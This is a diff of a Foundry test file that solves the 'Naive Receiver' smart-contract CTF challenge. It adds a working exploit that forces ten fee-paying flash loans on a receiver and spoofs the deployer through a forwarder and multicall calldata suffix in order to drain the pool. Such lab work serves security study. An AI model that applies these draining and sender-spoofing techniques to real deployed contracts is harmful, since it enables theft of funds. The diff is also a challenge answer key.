@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,74 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * 1. Anyone can call flashLoan specifying ANY receiver - the receiver pays the 1 ETH fee
+         *    This allows draining the receiver's 10 WETH by forcing 10 flash loans on them
+         * 
+         * 2. The pool's _msgSender() extracts the sender from the last 20 bytes of msg.data
+         *    when called through the trusted forwarder. Combined with multicall's delegatecall,
+         *    we can craft calldata that ends with deployer's address to spoof them.
+         *
+         * 3. The pool is funded by deployer (deposits[deployer] = 1000 WETH initially)
+         *    Flash loan fees also go to deployer, so after draining receiver:
+         *    deposits[deployer] = 1000 + 10 = 1010 WETH
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Build multicall data array with:
+         *    - 10x flashLoan calls targeting the receiver (drains their 10 WETH)
+         *    - 1x withdraw call with deployer address appended (spoofs _msgSender)
+         * 2. Sign and execute via forwarder in a single transaction
+         */
+
+        // Build the multicall payload
+        bytes[] memory calls = new bytes[](11);
         
+        // 10 flash loans to drain the receiver (1 ETH fee each)
+        for (uint256 i = 0; i < 10; i++) {
+            calls[i] = abi.encodeCall(
+                NaiveReceiverPool.flashLoan,
+                (IERC3156FlashBorrower(address(receiver)), address(weth), 0, bytes(""))
+            );
+        }
+        
+        // Withdraw call with deployer address appended to spoof _msgSender()
+        // This makes _msgSender() return deployer when called via forwarder
+        calls[10] = abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+            ),
+            deployer  // Append deployer address - _msgSender() will extract this
+        );
+
+        // Encode the multicall
+        bytes memory multicallData = abi.encodeCall(Multicall.multicall, (calls));
+
+        // Build the forwarder request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 30_000_000,
+            nonce: 0,
+            data: multicallData,
+            deadline: block.timestamp + 1 days
+        });
+
+        // Sign the request using EIP-712
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute via forwarder - single transaction!
+        forwarder.execute(request, signature);
     }
 
     /**
